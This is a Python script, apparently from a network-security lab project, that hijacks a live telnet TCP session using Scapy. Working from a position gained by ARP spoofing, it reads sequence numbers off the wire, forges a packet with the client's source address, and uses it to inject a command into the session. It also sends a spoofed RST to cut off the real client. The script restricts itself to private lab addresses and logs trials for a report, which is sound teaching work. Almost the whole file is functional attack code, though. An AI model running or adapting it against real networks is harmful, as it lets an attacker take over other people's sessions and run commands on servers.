#!/usr/bin/env python3
"""
Phase 3 - TCP Session Hijack (Design Report Section 4 / Section 3.4).

Requires the attacker to already be on-path (run arp_spoof.py first, in a
separate terminal, and keep it running). This script:
  1. Sniffs the live client<->server TCP stream to the telnet service and
     reads the SEQ/ACK numbers the server currently expects from the client
     (no blind guessing -- they're read straight off the wire).
  2. Crafts one spoofed segment: source IP = client, correct SEQ/ACK,
     PSH+ACK, attacker-chosen payload -- and sends it to the server.
  3. Watches the reply to report whether the server accepted it (no RST,
     ACK advances) or rejected it.
  4. Optionally sends a spoofed RST to the real client afterward, to knock
     it out of the now-desynchronized conversation (Section 3.4, Flags row).

Run on the ATTACKER VM (192.168.56.30), while the real client has an open
telnet session to the server and is actively typing:
    sudo python3 attacker/tcp_hijack.py --client 192.168.56.10 \
        --server 192.168.56.20 --port 2323 --iface eth1 \
        --payload "whoami"

For the report's plots, repeat the attempt several times against one
persistent client connection (see RUN.md) and log each trial to CSV:
    sudo python3 attacker/tcp_hijack.py --client 192.168.56.10 \
        --server 192.168.56.20 --port 2323 --iface eth1 \
        --payload "whoami" --trials 10 --trial-interval 5
"""

import argparse
import csv
import os
import time
from datetime import datetime, timezone

from scapy.all import IP, TCP, Raw, send, sniff

from common import require_lab_targets, setup_logging

log = setup_logging("tcp_hijack")

CSV_FIELDS = [
    "trial", "timestamp", "client_ip", "server_ip", "port",
    "captured_seq", "captured_ack", "window", "injected_len",
    "rst_seen", "ack_advanced", "verdict", "latency_ms",
]


def capture_stream_state(client_ip, server_ip, port, iface, capture_timeout):
    """Sniff the live stream and return the last-observed (seq, ack, sport, window)
    for a client->server segment -- i.e. exactly the values Section 3.4 says
    the attacker needs and can read directly because it is on-path."""
    state = {}

    def on_packet(pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
            return
        if pkt[IP].src != client_ip or pkt[IP].dst != server_ip:
            return
        if pkt[TCP].dport != port:
            return
        payload_len = len(bytes(pkt[TCP].payload))
        state["seq"] = pkt[TCP].seq + payload_len  # next byte the server expects
        state["ack"] = pkt[TCP].ack                # client's ack of server's data
        state["sport"] = pkt[TCP].sport
        state["window"] = pkt[TCP].window
        state["seen"] = True

    log.info(
        "Sniffing %s -> %s:%d for up to %ds. Type something in the real "
        "client's telnet session now so there's a live segment to read...",
        client_ip, server_ip, port, capture_timeout,
    )
    sniff(
        iface=iface,
        filter=f"tcp and host {client_ip} and host {server_ip} and port {port}",
        prn=on_packet,
        timeout=capture_timeout,
        stop_filter=lambda p: state.get("seen", False),
    )
    return state


def send_injected_segment(client_ip, client_port, server_ip, server_port, seq, ack, window, payload, iface):
    # Section 3.3 (IPv4): Source IP forged as the client's -- the server
    # treats this as part of the existing connection.
    ip_layer = IP(src=client_ip, dst=server_ip)
    # Section 3.4 (TCP): SEQ/ACK read live off the wire above; PSH+ACK to
    # push the payload immediately; Window kept consistent with the
    # observed stream so the segment doesn't look anomalous.
    tcp_layer = TCP(
        sport=client_port,
        dport=server_port,
        seq=seq,
        ack=ack,
        flags="PA",
        window=window,
    )
    packet = ip_layer / tcp_layer / Raw(load=payload.encode() + b"\r\n")
    log.info(
        "Injecting spoofed segment: src=%s:%d dst=%s:%d seq=%d ack=%d payload=%r",
        client_ip, client_port, server_ip, server_port, seq, ack, payload,
    )
    send(packet, iface=iface, verbose=False)
    return len(payload.encode() + b"\r\n")


def check_acceptance(client_ip, server_ip, port, injected_seq, injected_len, iface, watch_timeout):
    """Look at what the server sends back: an RST means rejection; an ACK
    number that has advanced past our injected bytes means the server
    accepted and processed the injected segment as legitimate."""
    result = {"rst": False, "ack_advanced": False}
    expected_ack_floor = injected_seq + injected_len

    def on_packet(pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
            return
        if pkt[IP].src != server_ip or pkt[IP].dst != client_ip:
            return
        if pkt[TCP].sport != port:
            return
        flags = pkt[TCP].flags
        if "R" in str(flags):
            result["rst"] = True
        if pkt[TCP].ack >= expected_ack_floor:
            result["ack_advanced"] = True

    sniff(
        iface=iface,
        filter=f"tcp and host {client_ip} and host {server_ip} and port {port}",
        prn=on_packet,
        timeout=watch_timeout,
    )
    return result


def send_spoofed_rst(server_ip, server_port, client_ip, client_port, seq, iface):
    # Section 3.4, Flags row: RST sent to the real client, appearing to
    # come from the server, to tear down its now-desynchronized view of
    # the connection.
    packet = (
        IP(src=server_ip, dst=client_ip)
        / TCP(sport=server_port, dport=client_port, seq=seq, flags="R")
    )
    log.info("Sending spoofed RST to real client %s:%d (as if from server)", client_ip, client_port)
    send(packet, iface=iface, verbose=False)


def append_csv_row(csv_path, row):
    os.makedirs(os.path.dirname(csv_path) or ".", exist_ok=True)
    write_header = not os.path.exists(csv_path)
    with open(csv_path, "a", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=CSV_FIELDS)
        if write_header:
            writer.writeheader()
        writer.writerow(row)


def run_trial(trial_num, args):
    """One capture -> inject -> verify cycle. Returns the CSV row dict so the
    caller can log it and, across --trials runs, feed a plot."""
    state = capture_stream_state(args.client, args.server, args.port, args.iface, args.capture_timeout)
    if not state.get("seen"):
        log.warning("Trial %d: no client->server segment observed, skipping.", trial_num)
        return None
    log.info(
        "Trial %d: captured seq=%d ack=%d client_port=%d window=%d",
        trial_num, state["seq"], state["ack"], state["sport"], state["window"],
    )

    inject_time = time.monotonic()
    injected_len = send_injected_segment(
        args.client, state["sport"], args.server, args.port,
        state["seq"], state["ack"], state["window"], args.payload, args.iface,
    )

    time.sleep(0.2)
    result = check_acceptance(args.client, args.server, args.port, state["seq"], injected_len, args.iface, args.watch_timeout)
    latency_ms = round((time.monotonic() - inject_time) * 1000, 1)

    if result["rst"]:
        verdict = "rejected"
    elif result["ack_advanced"]:
        verdict = "accepted"
    else:
        verdict = "inconclusive"
    log.info("Trial %d RESULT: %s (latency %.1f ms)", trial_num, verdict.upper(), latency_ms)

    return {
        "trial": trial_num,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "client_ip": args.client,
        "server_ip": args.server,
        "port": args.port,
        "captured_seq": state["seq"],
        "captured_ack": state["ack"],
        "window": state["window"],
        "injected_len": injected_len,
        "rst_seen": result["rst"],
        "ack_advanced": result["ack_advanced"],
        "verdict": verdict,
        "latency_ms": latency_ms,
    }, state["sport"], state["ack"]


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--client", required=True)
    parser.add_argument("--server", required=True)
    parser.add_argument("--port", type=int, default=2323, help="telnet service port")
    parser.add_argument("--iface", required=True)
    parser.add_argument("--payload", default="whoami", help="command/text to inject")
    parser.add_argument("--capture-timeout", type=int, default=20)
    parser.add_argument("--watch-timeout", type=int, default=5)
    parser.add_argument("--send-rst", action="store_true", help="also reset the real client, after the final trial")
    parser.add_argument("--trials", type=int, default=1, help="repeat the attempt this many times")
    parser.add_argument("--trial-interval", type=float, default=3.0, help="seconds to wait between trials")
    parser.add_argument("--csv", default="results/tcp_hijack_results.csv", help="path to append per-trial results")
    args = parser.parse_args()

    require_lab_targets(args.client, args.server)

    last_sport, last_ack = None, None
    completed = 0
    for trial_num in range(1, args.trials + 1):
        outcome = run_trial(trial_num, args)
        if outcome is None:
            continue
        row, last_sport, last_ack = outcome
        append_csv_row(args.csv, row)
        completed += 1
        if trial_num < args.trials:
            time.sleep(args.trial_interval)

    if completed == 0:
        raise SystemExit(
            "[ERROR] No trial observed a client->server segment. Make sure arp_spoof.py "
            "is running and the real client has an open, active connection (see RUN.md)."
        )
    log.info("Done: %d/%d trials logged to %s", completed, args.trials, args.csv)

    if args.send_rst and last_sport is not None:
        send_spoofed_rst(args.server, args.port, args.client, last_sport, last_ack, args.iface)


if __name__ == "__main__":
    main()
